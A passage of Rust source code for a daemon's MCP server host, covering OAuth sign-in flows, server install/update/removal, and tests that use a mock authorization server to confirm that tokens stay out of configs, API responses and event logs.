        oauth: input.oauth.map(|c| mcp_bridge::OAuthConfig {
            client_id: c.client_id,
            client_secret_ref: c.client_secret_ref,
            client_metadata_url: c.client_metadata_url,
            allow_loopback_http: c.allow_loopback_http,
            issuer: c.issuer,
            scopes: c.scopes,
            offline_access: c.offline_access,
        }),
        id: name.to_owned(),
        transport,
        enabled: input.enabled.unwrap_or(true),
        tool_allow: input.tool_allow,
        tool_exclude: input.tool_exclude,
        trust_hints: input.trust_hints,
        public_content: input.public_content,
        local_only: input.local_only,
        browser: input.browser,
        category,
        secret_headers: input.secret_headers,
        secret_env: input.secret_env,
        bots: input.bots.map(dedup_ids),
    };
    cfg.validate().map_err(map_err)?;
    Ok(cfg)
}

fn catalog_dto(e: &CatalogEntry, suggestion: Option<&str>) -> Option<McpCatalogEntryDto> {
    let transport = match e.install.transport.as_str() {
        "stdio" => McpTransportKind::Stdio,
        "http" => McpTransportKind::Http,
        _ => return None,
    };
    Some(McpCatalogEntryDto {
        id: e.id.clone(),
        name: e.name.clone(),
        description: e.description.clone(),
        category: e.category.clone(),
        homepage: e.homepage.clone(),
        icon: e.icon.clone(),
        install: McpCatalogInstallDto {
            transport,
            command: e.install.command.clone(),
            args: e.install.args.clone(),
            url: e.install.url.clone(),
            env: e.install.env.clone(),
            secret_env: e.install.secret_env.clone(),
            secret_headers: e.install.secret_headers.clone(),
            required_secrets: e
                .install
                .required_secrets
                .iter()
                .map(|s| McpRequiredSecretDto {
                    name: s.name.clone(),
                    label: s.label.clone(),
                    help_url: s.help_url.clone(),
                })
                .collect(),
            folder: e.install.folder.as_ref().map(|f| McpFolderDto {
                label: f.label.clone(),
                suggestion: suggestion.map(str::to_owned),
            }),
            oauth_client: e
                .install
                .oauth_client
                .as_ref()
                .map(|c| McpCatalogOAuthClientDto {
                    issuer: c.issuer.clone(),
                    scopes: c.scopes.clone(),
                    offline_access: c.offline_access,
                    setup: c.setup.clone(),
                }),
            test: e.install.test.as_ref().map(|t| McpCatalogTestDto {
                tool: t.tool.clone(),
                arguments: t.arguments.clone(),
            }),
            tool_allow: e.install.tool_allow.clone(),
        },
    })
}

#[async_trait]
impl McpControl for McpHost {
    async fn install_bundle(
        self: Arc<Self>,
        bundle: Vec<u8>,
        input: BundleApproval,
    ) -> Result<McpServerDto, McpControlError> {
        tokio::task::spawn_blocking(move || {
            let _op = self.ops.blocking_lock();
            self.check_writable()?;
            let store = self
                .secrets
                .as_deref()
                .ok_or_else(|| invalid("no MCP secret store is configured"))?;
            mcp_bridge::mcpb::install_with(
                &bundle,
                &input.approval_sha256,
                &input.values.0,
                &self.data_dir,
                store,
                |config| self.publish_import(&config),
            )
        })
        .await
        .map_err(|_| McpControlError::Internal("bundle install failed".into()))?
    }

    async fn install_registry(
        self: Arc<Self>,
        entry: mcp_bridge::registry::RegistryEntry,
        source: usize,
        values: ImportValues,
    ) -> Result<McpServerDto, McpControlError> {
        tokio::task::spawn_blocking(move || {
            let _op = self.ops.blocking_lock();
            self.check_writable()?;
            let store = self
                .secrets
                .as_deref()
                .ok_or_else(|| invalid("no MCP secret store is configured"))?;
            entry.install_with(source, &values.0, store, |config| {
                self.publish_import(&config)
            })
        })
        .await
        .map_err(|_| McpControlError::Internal("registry install failed".into()))?
    }
    fn redact(&self, text: &str) -> String {
        self.redactor
            .as_ref()
            .map_or_else(|| text.to_owned(), |r| r(text))
    }

    async fn auth_start(
        &self,
        name: &str,
        relay_port: Option<u16>,
    ) -> Result<McpAuthStart, McpControlError> {
        let mut flows = self.auth_flows.lock().await;
        self.check_http(name)?;
        if flows.get(name).is_some_and(SignInFlow::running) {
            return Err(McpControlError::Conflict(
                "a sign-in is already in progress".into(),
            ));
        }
        abort_sign_in(&mut flows, name).await;
        let handle = self.manager.server_handle(name).map_err(map_err)?;
        let sign_in = self
            .manager
            .start_sign_in(
                name,
                mcp_bridge::oauth::SignInOptions {
                    redirect_port: relay_port,
                    ..mcp_bridge::oauth::SignInOptions::default()
                },
            )
            .await
            .map_err(map_err)?;
        let response = McpAuthStart {
            authorization_url: sign_in.authorization_url().to_owned(),
            expires_in: mcp_bridge::oauth::CALLBACK_TIMEOUT.as_secs(),
            redirect_uri: sign_in.redirect_uri(),
            relayed: sign_in.is_relayed(),
        };
        let (paste, pasted) = tokio::sync::oneshot::channel();
        let (outcome, done) = tokio::sync::watch::channel(None);
        let task = tokio::spawn(async move {
            let result = async {
                sign_in
                    .finish_or_pasted(mcp_bridge::oauth::CALLBACK_TIMEOUT, Some(pasted))
                    .await?;
                handle.reenable().await.map(|_| ())
            }
            .await;
            outcome.send_replace(Some(result.as_ref().copied().map_err(ToString::to_string)));
            result
        });
        flows.insert(
            name.to_owned(),
            SignInFlow {
                task,
                paste: Some(paste),
                done,
            },
        );
        Ok(response)
    }

    async fn test_call(&self, name: &str) -> Result<McpTestResult, McpControlError> {
        // The call comes from the catalog entry of the same id, never from the
        // request: the owner's button cannot be pointed at another tool.
        let call = self
            .catalog
            .iter()
            .find(|e| e.id == name)
            .and_then(|e| e.install.test.clone())
            .ok_or_else(|| invalid("this app has no test"))?;
        if self.status_of(name) != McpStatus::Connected {
            return Err(invalid("the app is not connected"));
        }
        let handle = self.manager.server_handle(name).map_err(map_err)?;
        let arguments = call.arguments.as_object().cloned();
        let answer = handle
            .call_for_owner(&call.tool, arguments, 64 * 1024)
            .await
            .map_err(map_err)?;
        // The server's words are untrusted and may hold a secret it echoed.
        let answer = self.redact(&answer);
        Ok(daemon_api::mcp::summarize_test_output(&call.tool, &answer))
    }

    async fn auth_callback(
        &self,
        name: &str,
        redirect_url: &str,
    ) -> Result<McpAuthState, McpControlError> {
        let mut done = {
            let mut flows = self.auth_flows.lock().await;
            self.check_http(name)?;
            let waiting = flows
                .get_mut(name)
                .filter(|flow| flow.running())
                .and_then(|flow| flow.paste.take().map(|paste| (paste, flow.done.clone())));
            let Some((paste, done)) = waiting else {
                return Err(invalid("no sign-in is waiting for a redirect"));
            };
            if paste.send(redirect_url.to_owned()).is_err() {
                return Err(invalid("no sign-in is waiting for a redirect"));
            }
            done
        };
        // The flow stays tracked while this request waits: cancel, logout,
        // update and removal abort and join it as usual, and dropping this
        // request (or its timeout) leaves it to them.
        let finished = tokio::time::timeout(mcp_bridge::oauth::CALLBACK_TIMEOUT, async {
            done.wait_for(Option::is_some).await.map(|o| o.clone())
        })
        .await;
        let outcome = match finished {
            Ok(Ok(outcome)) => outcome,
            // The flow was aborted (cancel, logout, removal) before it ended.
            Ok(Err(_)) => return Err(invalid("the sign-in was cancelled")),
            Err(_) => return Err(invalid("sign-in did not finish")),
        };
        self.announce(name);
        if let Some(Err(message)) = outcome {
            return Err(invalid(format!("sign-in failed: {message}")));
        }
        self.auth_status(name).await
    }

    async fn auth_cancel(&self, name: &str) -> Result<McpAuthState, McpControlError> {
        self.check_http(name)?;
        {
            let mut flows = self.auth_flows.lock().await;
            abort_sign_in(&mut flows, name).await;
        }
        self.auth_status(name).await
    }

    async fn auth_status(&self, name: &str) -> Result<McpAuthState, McpControlError> {
        self.check_http(name)?;
        let flows = self.auth_flows.lock().await;
        if flows.get(name).is_some_and(SignInFlow::running) {
            return Ok(McpAuthState::SigningIn);
        }
        if self.snapshot(name).is_some_and(|s| s.auth_required) {
            return Ok(McpAuthState::AuthRequired);
        }
        Ok(
            if self
                .manager
                .has_stored_authorization(name)
                .await
                .map_err(map_err)?
            {
                McpAuthState::SignedIn
            } else {
                McpAuthState::SignedOut
            },
        )
    }

    async fn auth_logout(&self, name: &str) -> Result<McpAuthState, McpControlError> {
        let mut flows = self.auth_flows.lock().await;
        self.check_http(name)?;
        abort_sign_in(&mut flows, name).await;
        self.manager.sign_out(name).await.map_err(map_err)?;
        self.announce(name);
        Ok(McpAuthState::SignedOut)
    }
    fn list(&self) -> Vec<McpServerDto> {
        let all: Vec<McpServerConfig> = self.configs.lock().values().cloned().collect();
        all.iter().map(|c| self.dto(c)).collect()
    }

    async fn add(&self, input: McpServerInput) -> Result<McpServerDto, McpControlError> {
        let (cfg, handle, generation) = {
            let _op = self.ops.lock().await;
            self.check_writable()?;
            let name = input
                .name
                .clone()
                .ok_or_else(|| invalid("`name` is required"))?;
            let mut cfg = to_config(&name, input)?;
            canonicalize_config(&mut cfg, &self.root_guard);
            if self.configs.lock().contains_key(&name) {
                return Err(McpControlError::Conflict(format!(
                    "mcp server {name} already exists"
                )));
            }
            self.persist(|m| {
                m.insert(name.clone(), cfg.clone());
            })?;
            let handle = self.manager.register_server(cfg.clone()).map_err(map_err)?;
            let generation = self.begin_connect(&name, cfg.enabled);
            (cfg, handle, generation)
        };
        self.connect_registered(&cfg.id, generation, handle, false)
            .await;
        // A concurrent removal must not turn a successful add into NotFound.
        Ok(self.dto(&self.config_of(&cfg.id).unwrap_or(cfg)))
    }

    async fn update(
        &self,
        name: &str,
        input: serde_json::Value,
    ) -> Result<McpServerDto, McpControlError> {
        let mut flows = self.auth_flows.lock().await;
        abort_sign_in(&mut flows, name).await;
        let (cfg, old, handle, generation) = {
            let _op = self.ops.lock().await;
            self.check_writable()?;
            let prev = self.config_of(name)?;
            let mut cfg = merge_update(&prev, &input)?;
            canonicalize_config(&mut cfg, &self.root_guard);
            // Validate before anything is persisted or detached: the old
            // server keeps running when the new configuration is invalid.
            cfg.validate().map_err(map_err)?;
            self.persist(|m| {
                m.insert(name.to_owned(), cfg.clone());
            })?;
            if bots_only(&input) {
                // Only who may use the server changed: keep the connection
                // (in-flight calls finish) and switch the live list now.
                match self.manager.set_server_bots(name, cfg.bots.clone()) {
                    Ok(()) | Err(McpError::UnknownServer(_)) => {}
                    Err(error) => return Err(map_err(error)),
                }
                return Ok(self.dto(&cfg));
            }
            if prev.transport != cfg.transport {
                // A different program or address is a different server.
                self.manager.forget_tool_pins(name);
            }
            let old = match self.manager.detach_server(name) {
                Ok(handle) => Some(handle),
                Err(McpError::UnknownServer(_)) => None,
                Err(error) => return Err(map_err(error)),
            };
            self.connecting.lock().remove(name);
            self.announced.lock().remove(name);
            let handle = match self.manager.register_server(cfg.clone()) {
                Ok(handle) => handle,
                Err(error) => {
                    // Registration of a validated config should not fail; if
                    // it does, put the previous server and file back.
                    let _ = self.persist(|m| {
                        m.insert(name.to_owned(), prev.clone());
                    });
                    let restored = self.manager.register_server(prev.clone()).ok();
                    if let Some(old) = old {
                        old.close().await;
                    }
                    if let Some(restored) = restored {
                        let generation = self.begin_connect(name, prev.enabled);
                        self.connect_registered(name, generation, restored, false)
                            .await;
                    }
                    return Err(map_err(error));
                }
            };
            let generation = self.begin_connect(name, cfg.enabled);
            (cfg, old, handle, generation)
        };
        tokio::join!(
            async {
                if let Some(old) = old {
                    old.close().await;
                }
            },
            self.connect_registered(name, generation, handle, false)
        );
        Ok(self.dto(&self.config_of(&cfg.id).unwrap_or(cfg)))
    }

    async fn forget_bot(&self, bot_id: &str) -> Result<usize, McpControlError> {
        // One critical section for every server: concurrent updates cannot be
        // lost, and the removal is a remove-id on the stored lists.
        let _op = self.ops.lock().await;
        self.check_writable()?;
        let affected: Vec<String> = self
            .configs
            .lock()
            .values()
            .filter(|c| {
                c.bots
                    .as_ref()
                    .is_some_and(|l| l.iter().any(|b| b == bot_id))
            })
            .map(|c| c.id.clone())
            .collect();
        if affected.is_empty() {
            return Ok(0);
        }
        self.persist(|m| {
            for name in &affected {
                if let Some(list) = m.get_mut(name).and_then(|c| c.bots.as_mut()) {
                    list.retain(|b| b != bot_id);
                }
            }
        })?;
        for name in &affected {
            let live = self.config_of(name).ok().and_then(|c| c.bots);
            let _ = self.manager.set_server_bots(name, live);
        }
        Ok(affected.len())
    }

    async fn remove(&self, name: &str) -> Result<(), McpControlError> {
        let mut flows = self.auth_flows.lock().await;
        abort_sign_in(&mut flows, name).await;
        let old = {
            let _op = self.ops.lock().await;
            self.check_writable()?;
            let cfg = self.config_of(name)?;
            if let Some(import) = &cfg.import {
                return self.remove_import(&cfg, import).await;
            }
            self.persist(|m| {
                m.remove(name);
            })?;
            self.manager.forget_tool_pins(name);
            let old = match self.manager.detach_server(name) {
                Ok(handle) => Some(handle),
                Err(McpError::UnknownServer(_)) => None,
                Err(error) => return Err(map_err(error)),
            };
            self.connecting.lock().remove(name);
            self.forget(name);
            old
        };
        if let Some(old) = old {
            old.close().await;
        }
        Ok(())
    }

    async fn remove_forgetting_client_secret(&self, name: &str) -> Result<(), McpControlError> {
        let reference = self
            .config_of(name)?
            .oauth
            .and_then(|o| o.client_secret_ref);
        self.remove(name).await?;
        let (Some(reference), Some(store)) = (reference, self.secrets.clone()) else {
            return Ok(());
        };
        // Under the operations lock, so a server added at the same time cannot
        // point at the secret between the check and the delete.
        let _op = self.ops.lock().await;
        if self.secret_in_use(&reference, None) || !forgettable_client_secret(&reference) {
            return Ok(());
        }
        let deleted = tokio::task::spawn_blocking(move || store.delete(&reference)).await;
        if !matches!(deleted, Ok(Ok(_))) {
            support_logs::tracing::warn!(target: "praxi_support", reason = "component_warning", "warning: an OAuth client secret could not be deleted");
        }
        Ok(())
    }

    async fn reconnect(&self, name: &str) -> Result<McpServerDto, McpControlError> {
        let (handle, generation, reenable, fallback) = {
            let _op = self.ops.lock().await;
            let cfg = self.config_of(name)?;
            if !cfg.enabled {
                return Ok(self.dto(&cfg));
            }
            let fallback = cfg.clone();
            let (handle, reenable) = match self.manager.server_handle(name) {
                Ok(handle) => (handle, true),
                Err(McpError::UnknownServer(_)) => {
                    (self.manager.register_server(cfg).map_err(map_err)?, false)
                }
                Err(error) => return Err(map_err(error)),
            };
            let generation = self.begin_connect(name, true);
            (handle, generation, reenable, fallback)
        };
        self.connect_registered(name, generation, handle, reenable)
            .await;
        Ok(self.dto(&self.config_of(name).unwrap_or(fallback)))
    }

    async fn approve_tool_changes(
        &self,
        name: &str,
        tool: &str,
        hash: &str,
    ) -> Result<McpServerDto, McpControlError> {
        let cfg = {
            let _op = self.ops.lock().await;
            self.check_writable()?;
            self.config_of(name)?
        };
        if cfg.enabled {
            // A failed reconnect is not an error here: it shows in the status.
            match self.manager.approve_tool_changes(name, tool, hash).await {
                Ok(_) | Err(McpError::UnknownServer(_)) => {}
                Err(error @ McpError::ToolChangedAgain { .. }) => {
                    // The card on screen is stale: make every client reload it.
                    self.notify_changed(name);
                    return Err(map_err(error));
                }
                Err(error) => {
                    support_logs::tracing::warn!(target: "praxi_support", reason = "component_warning", "warning: re-approving MCP tools failed: {error}");
                }
            }
            self.announce(name);
        }
        Ok(self.dto(&self.config_of(name).unwrap_or(cfg)))
    }

    fn tools(&self, name: &str) -> Result<Vec<McpToolDto>, McpControlError> {
        self.config_of(name)?;
        let mut out: Vec<McpToolDto> = self
            .snapshot(name)
            .map(|s| s.tools)
            .unwrap_or_default()
            .iter()
            .filter_map(|t| self.registry.get(t))
            .map(|tool| {
                let spec = tool.spec();
                McpToolDto {
                    name: spec.name.clone(),
                    description: spec.description.clone(),
                    effect: serde_json::to_value(spec.effect)
                        .ok()
                        .and_then(|v| v.as_str().map(str::to_owned))
                        .unwrap_or_else(|| "destructive".to_owned()),
                }
            })
            .collect();
        out.sort_by(|a, b| a.name.cmp(&b.name));
        Ok(out)
    }

    fn catalog(&self) -> Vec<McpCatalogEntryDto> {
        self.catalog
            .iter()
            .filter_map(|e| catalog_dto(e, self.folder_suggestion.as_deref()))
            .collect()
    }

    fn subscribe(&self) -> broadcast::Receiver<McpServerChanged> {
        self.events.subscribe()
    }
}

impl Drop for McpHost {
    fn drop(&mut self) {
        for (_, flow) in self.auth_flows.get_mut().drain() {
            flow.task.abort();
        }
        if let Some(p) = self.poller.lock().take() {
            p.abort();
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use mcp_bridge::Backoff;
    use serde_json::json;

    fn fast_policy() -> McpPolicy {
        McpPolicy {
            quarantine_after: 3,
            backoff: Backoff {
                initial: Duration::from_millis(1),
                max: Duration::from_millis(1),
                max_attempts: 1,
            },
            connect_timeout: Duration::from_millis(400),
            call_timeout: Duration::from_millis(400),
        }
    }

    fn open(dir: &Path) -> Arc<McpHost> {
        McpHost::start_with_policy(dir, ToolRegistry::new(), None, None, None, fast_policy())
    }

    #[tokio::test]
    async fn imports_stay_disabled_across_restart_and_uninstall_cleans_owned_resources() {
        const BUNDLE: &[u8] =
            include_bytes!("../../../crates/mcp-bridge/tests/fixtures/weather.mcpb");
        const REGISTRY: &[u8] =
            include_bytes!("../../../crates/mcp-bridge/tests/fixtures/registry-search.json");
        let dir = tempfile::tempdir().unwrap();
        let store = Arc::new(secret_store::MemoryStore::new());
        let start = || {
            McpHost::start_with_policy(
                dir.path(),
                ToolRegistry::new(),
                Some(store.clone()),
                None,
                None,
                fast_policy(),
            )
        };
        let host = start();
        let installed = host
            .clone()
            .install_bundle(
                BUNDLE.to_vec(),
                BundleApproval {
                    approval_sha256: mcp_bridge::mcpb::inspect(BUNDLE).unwrap().sha256,
                    values: ImportValues(BTreeMap::from([("key".into(), "fixture-input".into())])),
                },
            )
            .await
            .unwrap();
        let registry = mcp_bridge::registry::parse_search(REGISTRY)
            .unwrap()
            .remove(0);
        let registry_server = host
            .clone()
            .install_registry(
                registry,
                0,
                ImportValues(BTreeMap::from([(
                    "WEATHER_KEY".into(),
                    "another-fixture-input".into(),
                )])),
            )
            .await
            .unwrap();
        for server in [&installed, &registry_server] {
            assert!(!server.enabled && server.tool_count == 0);
            assert!(!host.reconnect(&server.name).await.unwrap().enabled);
        }
        let config = std::fs::read_to_string(dir.path().join(MCP_FILE)).unwrap();
        assert!(!config.contains("fixture-input"));
        let unpacked = dir.path().join("mcp/fixture-weather");
        assert!(unpacked.join("server/index.js").is_file());
        assert_eq!(store.list_names().unwrap().len(), 2);
        host.shutdown().await;
        drop(host);

        let host = start();
        assert_eq!(host.list().len(), 2);
        assert!(
            host.list()
                .iter()
                .all(|server| !server.enabled && server.tool_count == 0)
        );
        // An edited environment mapping doesn't orphan the original secret.
        host.update(&installed.name, json!({"secret_env": {}}))
            .await
            .unwrap();
        host.remove(&installed.name).await.unwrap();
        host.remove(&registry_server.name).await.unwrap();
        assert_eq!(host.list().len(), 0);
        assert!(!unpacked.exists());
        assert_eq!(store.list_names().unwrap(), Vec::<String>::new());
        host.shutdown().await;
    }

    #[tokio::test]
    async fn oauth_token_values_are_registered_with_the_live_daemon_redactor() {
        const ACCESS: &str = "host-access-sentinel-834c";
        const REFRESH: &str = "host-refresh-sentinel-0fd9";
        let dir = tempfile::tempdir().unwrap();
        let url = "http://127.0.0.1:1/mcp";
        let config = McpServerConfig::http("redaction", url);
        TomlFileStore::new(dir.path().join(MCP_FILE))
            .save(&[config])
            .unwrap();
        let store = Arc::new(secret_store::MemoryStore::new());
        store
            .set(
                "mcp/redaction/oauth",
                &json!({
                    "resource": url,
                    "credentials": {"client_id": "fixture", "token_response": {
                        "access_token": ACCESS, "refresh_token": REFRESH, "token_type": "Bearer"
                    }, "granted_scopes": [], "token_received_at": null, "issuer": null}
                })
                .to_string(),
            )
            .unwrap();
        let redactor = agent_core::SharedRedactor::default();
        let external: mcp_bridge::ExternalRedactor = {
            let handle = redactor.clone();
            Arc::new(move |text| handle.redact(text))
        };
        let registrar: mcp_bridge::oauth::SecretRegistrar = {
            let handle = redactor.clone();
            Arc::new(move |value| handle.register(value))
        };
        let host = McpHost::start_with_policy(
            dir.path(),
            ToolRegistry::new(),
            Some(store),
            Some(external),
            Some(registrar),
            fast_policy(),
        );
        tokio::time::timeout(Duration::from_secs(2), async {
            while redactor.redact(ACCESS).contains(ACCESS) {
                tokio::time::sleep(Duration::from_millis(5)).await;
            }
        })
        .await
        .unwrap();
        let rendered = redactor.redact(&format!("access={ACCESS} refresh={REFRESH}"));
        assert!(!rendered.contains(ACCESS));
        assert!(!rendered.contains(REFRESH));
        // Registration survives the production redactor's periodic reload.
        redactor.replace(secret_store::Redactor::default());
        assert!(!redactor.redact(ACCESS).contains(ACCESS));
        assert!(!redactor.redact(REFRESH).contains(REFRESH));
        host.shutdown().await;
    }

    /// Fake protected MCP server and authorization server on one loopback
    /// port: `/mcp` answers 401 unless the bearer is `access`, then speaks MCP.
    struct FakeRemote {
        access: &'static str,
    }

    impl wiremock::Respond for FakeRemote {
        fn respond(&self, request: &wiremock::Request) -> wiremock::ResponseTemplate {
            let authorized = request
                .headers
                .get("authorization")
                .and_then(|v| v.to_str().ok())
                == Some(format!("Bearer {}", self.access).as_str());
            if !authorized {
                return wiremock::ResponseTemplate::new(401)
                    .insert_header("www-authenticate", "Bearer");
            }
            let body: serde_json::Value = serde_json::from_slice(&request.body).unwrap_or_default();
            let method = body["method"].as_str().unwrap_or_default();
            if body.get("id").is_none() {
                let status = if method.starts_with("notifications/") {
                    202
                } else {
                    405
                };
                return wiremock::ResponseTemplate::new(status);
            }
            let result = match method {
                "initialize" => json!({
                    "protocolVersion": "2025-11-25", "capabilities": {"tools": {}},
                    "serverInfo": {"name": "oauth-host-fixture", "version": "1"},
                }),
                "server/discover" => json!({
                    "resultType": "complete", "supportedVersions": ["2026-07-28"],
                    "capabilities": {"tools": {}}, "ttlMs": 0, "cacheScope": "private",
                    "_meta": {"io.modelcontextprotocol/serverInfo": {"name": "oauth-host-fixture", "version": "1"}},
                }),
                "tools/list" => json!({
                    "resultType": "complete", "ttlMs": 0, "cacheScope": "private",
                    "tools": [{"name": "echo", "description": "Echo", "inputSchema": {"type": "object"}}],
                }),
                _ => json!({"resultType": "complete"}),
            };
            wiremock::ResponseTemplate::new(200)
                .set_body_json(json!({"jsonrpc": "2.0", "id": body["id"], "result": result}))
        }
    }

    async fn fake_remote(access: &'static str, refresh: &'static str) -> wiremock::MockServer {
        fake_remote_with_token_delay(access, refresh, Duration::ZERO).await
    }

    /// [`fake_remote`] whose token endpoint answers only after `delay`.
    async fn fake_remote_with_token_delay(
        access: &'static str,
        refresh: &'static str,
        delay: Duration,
    ) -> wiremock::MockServer {
        use wiremock::matchers::{method, path, path_regex};
        use wiremock::{Mock, ResponseTemplate};
        let server = wiremock::MockServer::start().await;
        let base = server.uri();
        Mock::given(path("/mcp"))
            .respond_with(FakeRemote { access })
            .mount(&server)
            .await;
        Mock::given(path_regex("oauth-protected-resource"))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "resource": format!("{base}/mcp"),
                "authorization_servers": [base],
            })))
            .mount(&server)
            .await;
        Mock::given(path_regex(
            "oauth-authorization-server|openid-configuration",
        ))
        .respond_with(ResponseTemplate::new(200).set_body_json(json!({
            "issuer": base,
            "authorization_endpoint": format!("{base}/authorize"),
            "token_endpoint": format!("{base}/token"),
            "response_types_supported": ["code"],
            "grant_types_supported": ["authorization_code", "refresh_token"],
            "code_challenge_methods_supported": ["S256"],
            "authorization_response_iss_parameter_supported": true,
            "token_endpoint_auth_methods_supported": ["none"],
        })))
        .mount(&server)
        .await;
        Mock::given(method("POST"))
            .and(path("/token"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_json(json!({
                        "access_token": access, "token_type": "Bearer",
                        "expires_in": 3600, "refresh_token": refresh,
                    }))
                    .set_delay(delay),
            )
            .mount(&server)
            .await;
        server
    }

    fn query_pairs(url: &str) -> HashMap<String, String> {
        reqwest::Url::parse(url)
            .unwrap()
            .query_pairs()
            .map(|(k, v)| (k.into_owned(), v.into_owned()))
            .collect()
    }

    /// Play the browser: hit the loopback `redirect_uri` with `query`.
    async fn browser_redirect(authorization_url: &str, query: &str) -> std::io::Result<String> {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let redirect =
            reqwest::Url::parse(&query_pairs(authorization_url)["redirect_uri"]).unwrap();
        let address = format!(
            "{}:{}",
            redirect.host_str().unwrap(),
            redirect.port().unwrap()
        );
        let mut socket = tokio::net::TcpStream::connect(&address).await?;
        socket
            .write_all(
                format!(
                    "GET {}?{query} HTTP/1.1\r\nHost: {address}\r\n\r\n",
                    redirect.path()
                )
                .as_bytes(),
            )
            .await?;
        let mut out = String::new();
        socket.read_to_string(&mut out).await?;
        Ok(out)
    }

    async fn wait_auth(host: &McpHost, name: &str, want: McpAuthState) {
        let reached = tokio::time::timeout(Duration::from_secs(10), async {
            while host.auth_status(name).await.unwrap() != want {
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        })
        .await;
        assert!(reached.is_ok(), "{name}: auth state never became {want:?}");
    }

    async fn wait_for(host: &McpHost, name: &str, want: McpStatus) {
        let reached = tokio::time::timeout(Duration::from_secs(10), async {
            while host.status_of(name) != want {
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        })
        .await;
        assert!(
            reached.is_ok(),
            "{name}: wanted {want:?}, is {:?}",
            host.status_of(name)
        );
    }

    #[tokio::test(flavor = "multi_thread")]
    #[allow(clippy::too_many_lines)] // One user journey: 401, cancel, sign-in, logout.
    async fn user_sign_in_through_the_host_connects_and_logout_forgets() {
        const ACCESS: &str = "host-flow-access-sentinel-5d21";
        const REFRESH: &str = "host-flow-refresh-sentinel-a07e";
        let remote = fake_remote(ACCESS, REFRESH).await;
        let base = remote.uri();
        let dir = tempfile::tempdir().unwrap();
        let mut config = McpServerConfig::http("remote", format!("{base}/mcp"));
        config.oauth = Some(mcp_bridge::OAuthConfig {
            client_id: Some("praxi-host-test".into()),
            allow_loopback_http: true,
            issuer: Some(base.clone()),
            ..mcp_bridge::OAuthConfig::default()
        });
        TomlFileStore::new(dir.path().join(MCP_FILE))
            .save(&[config])
            .unwrap();
        let store = Arc::new(secret_store::MemoryStore::new());
        let redactor = agent_core::SharedRedactor::default();
        let registrar: mcp_bridge::oauth::SecretRegistrar = {
            let handle = redactor.clone();
            Arc::new(move |value| handle.register(value))
        };
        let registry = ToolRegistry::new();
        let host = McpHost::start_with_policy(
            dir.path(),
            registry.clone(),
            Some(store.clone()),
            None,
            Some(registrar),
            fast_policy(),
        );
        let mut events = host.subscribe();

        // A 401 waits for the user; it is neither an error nor a quarantine.
        wait_for(&host, "remote", McpStatus::AuthRequired).await;
        assert_eq!(
            host.auth_status("remote").await.unwrap(),
            McpAuthState::AuthRequired
        );
        assert_eq!(
            host.manager
                .snapshot("remote")
                .unwrap()
                .consecutive_failures,
            0
        );
        assert!(registry.get("mcp:remote/echo").is_none());

        // Sign-in, then cancel: the one-shot listener is gone afterwards.
        let started = host.auth_start("remote", None).await.unwrap();
        assert_eq!(started.expires_in, 300);
        assert_eq!(
            host.auth_status("remote").await.unwrap(),
            McpAuthState::SigningIn
        );
        assert!(matches!(
            host.auth_start("remote", None).await,
            Err(McpControlError::Conflict(_))
        ));
        let cancelled = host.auth_cancel("remote").await.unwrap();
        assert_ne!(cancelled, McpAuthState::SigningIn);
        let params = query_pairs(&started.authorization_url);
        let late = browser_redirect(
            &started.authorization_url,
            &format!("code=c&state={}&iss={base}", params["state"]),
        )
        .await;
        assert!(
            late.as_ref().map_or(true, |r| !r.contains(" 200 ")),
            "callback still open: {late:?}"
        );
        assert!(store.get("mcp/remote/oauth").unwrap().is_none());

        // Full sign-in: the tool list arrives with the bearer.
        let started = host.auth_start("remote", None).await.unwrap();
        let params = query_pairs(&started.authorization_url);
        assert_eq!(params["code_challenge_method"], "S256");
        assert_eq!(params["resource"], format!("{base}/mcp"));
        browser_redirect(
            &started.authorization_url,
            &format!("code=code-1&state={}&iss={base}", params["state"]),
        )
        .await
        .unwrap();
        wait_for(&host, "remote", McpStatus::Connected).await;
        // The flow ends after its reconnect (tool discovery included).
        wait_auth(&host, "remote", McpAuthState::SignedIn).await;
        assert!(registry.get("mcp:remote/echo").is_some());
        let stored = store.get("mcp/remote/oauth").unwrap().unwrap();
        assert!(stored.expose().contains(ACCESS));
        // Neither the DTO, the config file nor the event stream carries a token.
        let dto = serde_json::to_string(&host.list()).unwrap();
        let file = std::fs::read_to_string(dir.path().join(MCP_FILE)).unwrap();
        // The status poller announces the move to `connected` (POLL_EVERY).
        let mut seen = String::new();
        while !seen.contains("\"connected\"") {
            let Ok(Ok(event)) = tokio::time::timeout(POLL_EVERY * 3, events.recv()).await else {
                break;
            };
            seen.push_str(&serde_json::to_string(&event).unwrap());
        }
        assert!(
            seen.contains("auth_required") && seen.contains("connected"),
            "{seen}"
        );
        for text in [&dto, &file, &seen] {
            assert!(!text.contains(ACCESS) && !text.contains(REFRESH));
        }
        assert!(!redactor.redact(ACCESS).contains(ACCESS));
        assert!(!redactor.redact(REFRESH).contains(REFRESH));

        // Logout forgets the credential and the tools.
        assert_eq!(
            host.auth_logout("remote").await.unwrap(),
            McpAuthState::SignedOut
        );
        assert!(store.get("mcp/remote/oauth").unwrap().is_none());
        assert!(registry.get("mcp:remote/echo").is_none());
        assert_ne!(
            host.auth_status("remote").await.unwrap(),
            McpAuthState::SignedIn
        );

        // OAuth routes refuse stdio servers.
        host.add(stdio("local", false)).await.unwrap();
        assert!(matches!(
            host.auth_start("local", None).await,
            Err(McpControlError::Invalid(_))
        ));
        host.shutdown().await;
    }

    /// Every file under `dir`, recursively (event logs, the SQLite database
    /// holding the audit log and its WAL, `mcp.toml` ...).
    fn files_under(dir: &Path) -> Vec<std::path::PathBuf> {
        let mut out = Vec::new();
        let mut stack = vec![dir.to_path_buf()];
        while let Some(d) = stack.pop() {
            for entry in std::fs::read_dir(&d).unwrap().flatten() {
                let path = entry.path();
                if path.is_dir() {
                    stack.push(path);
                } else {
                    out.push(path);
                }
            }
        }
        out
    }

    fn contains(haystack: &[u8], needle: &str) -> bool {
        haystack
            .windows(needle.len())
            .any(|w| w == needle.as_bytes())
    }

    /// Sign-in driven through the real daemon routes: the tokens reach the
    /// secret store only, never an API response, the global event stream,
    /// the audit log, a run event log or any other file of the data dir.
    #[tokio::test(flavor = "multi_thread")]
    #[allow(clippy::too_many_lines)] // One linear daemon journey.
